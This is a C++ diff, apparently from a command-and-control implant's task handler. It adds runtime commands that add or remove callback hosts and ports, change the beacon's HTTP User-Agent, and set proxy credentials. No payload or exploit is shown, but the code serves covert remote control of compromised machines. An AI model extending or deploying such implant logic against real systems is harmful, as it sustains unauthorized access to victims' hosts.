@@ -1386,8 +1386,204 @@ auto DECLFN Task::Config(
                 Self->Config.Postex.ForkPipe = ForkPipeName;
 
                 KhDbg("Fork pipe name changed to: %s", Self->Config.Postex.ForkPipe);
+
+                break;
             }
-        }
+            case Enm::Config::CallbackHost: {
+                INT32 ActionId     = Self->Psr->Int32( Parser );
+                CHAR* CallbackHost = Self->Psr->Str( Parser, nullptr );
+                ULONG CallbackPort = Self->Psr->Int32( Parser );
+
+                WCHAR wCallbackHost[MAX_PATH*2] = { 0 };
+                Str::CharToWChar( wCallbackHost, CallbackHost, MAX_PATH * 2 );
+
+                if ( ActionId == CFG_HOST_ACTID_RM ) {
+                    WCHAR** NewHostList = NULL;
+                    ULONG*  NewPortList = NULL;
+
+                    WCHAR** OldHostList  = Self->Config.Web.Host;
+                    ULONG*  OldPortList  = Self->Config.Web.Port;
+                    ULONG   HostListSize = Self->Config.Web.HostQtt;
+                    ULONG   PortListSize = Self->Config.Web.PortQtt;
+
+                    BOOL  Found      = FALSE;
+                    ULONG FoundIndex = 0;
+                    
+                    for ( int i = 0; i < HostListSize; i++ ) {
+                        if (
+                            Str::CompareW( wCallbackHost, OldHostList[i]) == 0 && 
+                            CallbackPort == OldPortList[i] 
+                        ) {
+                            Found      = TRUE;
+                            FoundIndex = i;
+                            break;
+                        }
+                    }
+
+                    if ( ! Found ) {
+                        break; 
+                    }
+
+                    ULONG NewSize = HostListSize - 1;
+                    if ( NewSize > 0 ) {
+                        NewHostList = (WCHAR**)hAlloc( NewSize * sizeof(WCHAR*) );
+                        NewPortList = (ULONG* )hAlloc( NewSize * sizeof(ULONG ) ) ;
+
+                        for (ULONG i = 0; i < FoundIndex; i++) {
+                            ULONG HostLen = Str::LengthW( OldHostList[i] ) + 1;
+                            NewHostList[i] = (WCHAR*)hAlloc( HostLen * sizeof(WCHAR)) ;
+
+                            Str::CopyW( NewHostList[i], OldHostList[i] );
+                            NewPortList[i] = OldPortList[i];
+                        }
+
+                        for ( int i = FoundIndex + 1; i < HostListSize; i++ ) {
+                            ULONG  NewIndex = i - 1;
+                            ULONG HostLen = Str::LengthW(OldHostList[i]) + 1;
+                            NewHostList[NewIndex] = (WCHAR*)hAlloc( HostLen * sizeof(WCHAR) ) ;
+
+                            Str::CopyW(NewHostList[NewIndex], OldHostList[i]);
+                            NewPortList[NewIndex] = OldPortList[i];
+                        }
+                    }
+
+                    if ( OldHostList && OldPortList ) {
+                        for ( int i = 0; i < HostListSize; i++ ) {
+                            if ( OldHostList[i] ) {
+                                hFree( OldHostList[i] );
+                            }
+                        }
+                        hFree( OldHostList );
+                        hFree( OldPortList );
+                    }
+
+                    Self->Config.Web.Host    = NewHostList;
+                    Self->Config.Web.Port    = NewPortList;
+                    Self->Config.Web.HostQtt = NewSize;
+                    Self->Config.Web.PortQtt = NewSize;
+
+                } else if ( ActionId == CFG_HOST_ACTID_ADD ) {
+                    WCHAR** NewHostList = NULL;
+                    ULONG*  NewPortList = NULL;
+
+                    WCHAR** OldHostList  = Self->Config.Web.Host;
+                    ULONG*  OldPortList  = Self->Config.Web.Port;
+                    ULONG   HostListSize = Self->Config.Web.HostQtt;
+
+                    BOOL AlreadyExists = FALSE;
+                    if ( OldHostList && OldPortList ) {
+                        for (ULONG i = 0; i < HostListSize; i++) {
+                            if ( 
+                                Str::CompareW( wCallbackHost, OldHostList[i] ) == 0 && 
+                                CallbackPort == OldPortList[i] 
+                            ) {
+                                AlreadyExists = TRUE;
+                                break;
+                            }
+                        }
+                    }
+
+                    if ( AlreadyExists ) {
+                        break; 
+                    }
+
+                    ULONG NewSize = HostListSize + 1;
+                    NewHostList = (WCHAR**)hAlloc( NewSize * sizeof(WCHAR*) );
+                    NewPortList = (ULONG* )hAlloc( NewSize * sizeof(ULONG ) ) ;
+
+                    if ( OldHostList && OldPortList ) {
+                        for (ULONG i = 0; i < HostListSize; i++) {
+                            ULONG HostLen = Str::LengthW( OldHostList[i] ) + 1;
+                            NewHostList[i] = (WCHAR*)hAlloc( HostLen * sizeof(WCHAR) ) ;
+
+                            Str::CopyW( NewHostList[i], OldHostList[i] );
+                            NewPortList[i] = OldPortList[i];
+                        }
+                    }
+
+                    ULONG NewHostLen = Str::LengthW( wCallbackHost ) + 1;
+                    NewHostList[NewSize - 1] = (WCHAR*)hAlloc( NewHostLen * sizeof(WCHAR)) ;
+
+                    Str::CopyW(NewHostList[NewSize - 1], wCallbackHost);
+                    NewPortList[NewSize - 1] = CallbackPort;
+
+                    if ( OldHostList && OldPortList ) {
+                        for (ULONG i = 0; i < HostListSize; i++) {
+                            if ( OldHostList[i] ) {
+                                hFree( OldHostList[i] );
+                            }
+                        }
+                        hFree( OldHostList );
+                        hFree( OldPortList );
+                    }
+
+                    Self->Config.Web.Host   = NewHostList;
+                    Self->Config.Web.Port    = NewPortList;
+                    Self->Config.Web.HostQtt = NewSize;
+                    Self->Config.Web.PortQtt = NewSize;
+                }
+
+                break;
+            }
+            case Enm::Config::CallbackUserAgt: {
+                ULONG UserAgtSize = 0;
+                CHAR* UserAgent   = Self->Psr->Str( Parser, &UserAgtSize );
+
+                WCHAR* wUserAgent = (WCHAR*)hAlloc( UserAgtSize * 2 );
+
+                Str::CharToWChar( wUserAgent, UserAgent, UserAgtSize * 2 );
+
+                if ( Self->Hp->CheckPtr( Self->Config.Web.UserAgent ) ) {
+                    hFree( Self->Config.Web.UserAgent );
+                }
+
+                Self->Config.Web.UserAgent = wUserAgent;
+
+                break;
+            }
+            case Enm::Config::CallbackProxy: {
+                BOOL  ProxyEbl  = Self->Psr->Int32( Parser );
+                ULONG UrlSize   = 0;
+                CHAR* ProxyUrl  = Self->Psr->Str( Parser, &UrlSize );
+                ULONG UserSize  = 0;
+                CHAR* ProxyUser = Self->Psr->Str( Parser, &UserSize );
+                ULONG PassSize  = 0;
+                CHAR* ProxyPass = Self->Psr->Str( Parser, &PassSize );
+                
+                if ( Self->Hp->CheckPtr( Self->Config.Web.ProxyUrl ) && ( ProxyUrl && UrlSize ) ) {
+                    hFree( Self->Config.Web.ProxyUrl ); 
+                }
+
+                if ( ProxyUrl && UrlSize ) {
+                    WCHAR* wProxyUrl = (WCHAR*)hAlloc( UrlSize * 2 );
+                    Str::CharToWChar( wProxyUrl, ProxyUrl, UrlSize * 2 );
+                    Self->Config.Web.ProxyUrl = wProxyUrl;
+                }
+                
+
+                if ( Self->Hp->CheckPtr( Self->Config.Web.ProxyUsername ) && ( ProxyUser && UserSize ) ) {
+                    hFree( Self->Config.Web.ProxyUsername );
+                }
+
+                if ( ProxyUser && UserSize ) {
+                    WCHAR* wProxyUser = (WCHAR*)hAlloc( UserSize * 2 );
+                    Str::CharToWChar( wProxyUser, ProxyUser, UserSize * 2 );
+                    Self->Config.Web.ProxyUsername = wProxyUser;
+                }
+
+                if ( Self->Hp->CheckPtr( Self->Config.Web.ProxyPassword ) && ( ProxyPass && PassSize ) ) {
+                    hFree( Self->Config.Web.ProxyPassword );
+                }
+
+                if ( ProxyPass && PassSize ) {
+                    WCHAR* wProxyPass = (WCHAR*)hAlloc( PassSize * 2 );
+                    Str::CharToWChar( wProxyPass, ProxyPass, PassSize * 2 );
+                    Self->Config.Web.ProxyPassword = wProxyPass;
+                }
+
+                break;
+            }
+        }        
     }
 
     return KhRetSuccess;
